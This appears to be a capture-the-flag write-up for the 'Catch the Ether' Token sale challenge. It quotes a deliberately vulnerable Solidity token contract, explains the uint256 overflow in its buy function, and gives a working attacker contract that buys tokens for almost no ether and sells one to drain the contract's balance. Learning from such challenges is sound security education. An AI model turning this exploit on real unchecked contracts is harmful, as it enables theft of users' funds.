# Catch the Ether 8: Token sale

Arithmetic Overflow

## The Task Intro

This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether. The contract starts off with a balance of 1 ether. See if you can take some of that away.

## The Task Code

```apache
pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
```

## The Solution

After studing this code I thought there is no vulnerability and no way to catch some ether. Having the hint of arithmetic overflow/underflow might be a vulnerability from Jeffs task sheet, I needed to go back to the Arithmetic Underflow of Ethernaut 5. There a parameter of type uint was used in a substraction as Subrahend. With a minuend of 20 I could substract 21 to cause a underflow and receive a crazy high number of tokens.

In this challenge the buy function is vulnerable for a overflow, because msg.value needs to be higher as the uint256 max value - starting to count from the beginning again. Therefore the task is:

1. calculate the numTokens needed to let the uint256 to overflow
2. calculate what amount of eth we need to send with this task

```apache
contract Crack {
    TokenSaleChallenge tsc;

    uint256 public constant MAX_VALUE = 2 ** 256 - 1;
    uint256 public constant overflowNumTokens = (MAX_VALUE / 10 ** 18) + 1;
    uint256 public constant ethToSend = (overflowNumTokens * 10 ** 18) - MAX_VALUE - 1;

    function Crack(TokenSaleChallenge _tbc) public payable {
        tsc = _tbc;
    }

    function attack() {
        tsc.buy.value(ethToSend)(overflowNumTokens);
    }

    function balance() external view returns (uint256) {
        return tsc.balanceOf(address(this));
    }

    function sellToken() public {
        tsc.sell(1);
    }

    function() public payable {}
}
```
